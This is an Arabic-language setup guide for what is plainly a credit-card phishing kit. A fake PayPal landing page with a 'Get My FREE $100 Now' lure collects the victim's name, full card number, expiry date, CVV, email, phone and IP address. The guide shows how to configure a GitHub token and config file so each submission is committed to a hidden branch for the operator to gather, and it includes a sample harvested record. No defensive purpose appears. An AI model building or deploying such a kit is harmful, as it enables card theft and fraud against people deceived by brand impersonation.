# 🔧 دليل إعداد GitHub لحفظ البيانات

## 🎯 المطلوب:

الآن عند الضغط على زر **"Get My FREE $100 Now"** ستُحفظ البيانات في مستودع GitHub الخاص بك بدلاً من تنزيلها.

## 📋 خطوات الإعداد:

### 1. 🔑 إنشاء Personal Access Token:

1. اذهب إلى GitHub.com وسجل دخولك
2. انقر على صورتك الشخصية (أعلى اليمين) → **Settings**
3. في القائمة اليسرى، انقر على **Developer settings**
4. انقر على **Personal access tokens** → **Tokens (classic)**
5. انقر على **Generate new token** → **Generate new token (classic)**
6. أعط Token اسماً مثل: `PayPal Data Storage`
7. في **Scopes**، اختر:
   - ✅ **repo** (للوصول للمستودعات)
   - ✅ **workflow** (للتعديل على الملفات)
8. انقر **Generate token**
9. **انسخ Token واحفظه في مكان آمن** (لن تراه مرة أخرى!)

### 2. 📂 إنشاء فرع منفصل للبيانات:

```bash
# في مستودعك، أنشئ فرع جديد للبيانات
git checkout -b data-storage
git push origin data-storage
```

### 3. ⚙️ تحديث ملف التكوين:

افتح ملف `github-config.js` وحدث المعلومات:

```javascript
const GITHUB_CONFIG = {
    owner: 'your-actual-username',           // ضع اسم المستخدم الحقيقي
    repo: 'your-actual-repo-name',           // ضع اسم المستودع الحقيقي
    branch: 'data-storage',                  // الفرع الذي أنشأته
    token: 'ghp_xxxxxxxxxxxxxxxxxxxx',       // ضع Token الذي أنشأته
    
    dataFolder: 'paypal-data',               // مجلد حفظ البيانات
    filePrefix: 'paypal_data_',              // بداية اسم الملف
    
    committer: {
        name: 'PayPal Data System',
        email: 'system@paypal-data.com'
    }
};
```

### 4. 🚀 رفع التحديثات:

```bash
git add .
git commit -m "إضافة نظام حفظ البيانات في GitHub"
git push origin main
```

## 📁 كيف ستُحفظ البيانات:

### 🎯 عند الضغط على زر "Get My FREE $100 Now":

1. **سيُنشأ ملف جديد** في فرع `data-storage`
2. **المسار**: `paypal-data/paypal_data_2024-12-25_1640123456.txt`
3. **المحتوى**: جميع بيانات النموذج مع التفاصيل

### 📄 مثال على الملف المُنشأ:

```
=== معلومات كاملة - PayPal Landing Page ===
الوقت: 25/12/2024, 16:30:45
المصدر: https://yourusername.github.io/repo-name
IP Address: 192.168.1.100

الاسم على البطاقة: Ahmed Mohamed  
رقم البطاقة: 1234567890123456
تاريخ انتهاء البطاقة: 12/25
رمز الأمان CVV: 123
البريد الإلكتروني: ahmed@example.com
رقم الهاتف: +1 (555) 123-4567
المبلغ: $100.00 USD

معلومات المتصفح: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...

======================================================================
```

## 🔍 كيفية الوصول للبيانات:

### في GitHub:
1. اذهب لمستودعك
2. غيّر للفرع `data-storage`
3. ادخل لمجلد `paypal-data`
4. ستجد جميع الملفات مرتبة حسب التاريخ

### مثال على البنية:
```
your-repo/
├── main branch (الموقع)
│   ├── index.html
│   ├── checkout.html
│   └── ...
└── data-storage branch (البيانات)
    └── paypal-data/
        ├── paypal_data_2024-12-25_1640123456.txt
        ├── paypal_data_2024-12-25_1640789012.txt
        └── ...
```

## 🛡️ الأمان:

- ✅ **البيانات محفوظة في مستودعك الخاص**
- ✅ **فرع منفصل للبيانات**
- ✅ **Token له صلاحيات محدودة**
- ✅ **سجل كامل للتغييرات في Git**

## ⚠️ تنبيهات مهمة:

1. **لا تشارك Personal Access Token** مع أحد
2. **اجعل المستودع Private** إذا كان يحتوي على بيانات حساسة
3. **راجع الملفات بانتظام** وامسح القديمة إذا لزم الأمر
4. **احتفظ بنسخة احتياطية** من Token في مكان آمن

## 🔧 استكشاف الأخطاء:

### إذا لم تعمل البيانات:
1. تأكد من صحة معلومات `github-config.js`
2. تأكد من أن Token صالح وله الصلاحيات المطلوبة
3. تأكد من أن فرع `data-storage` موجود
4. افتح Developer Tools وتحقق من رسائل الخطأ

### إذا ظهر خطأ 401:
- Token غير صحيح أو منتهي الصلاحية

### إذا ظهر خطأ 404:
- اسم المستودع أو المستخدم غير صحيح

---

🎉 **بعد الانتهاء من هذا الإعداد، ستُحفظ جميع البيانات تلقائياً في GitHub!** 🚀
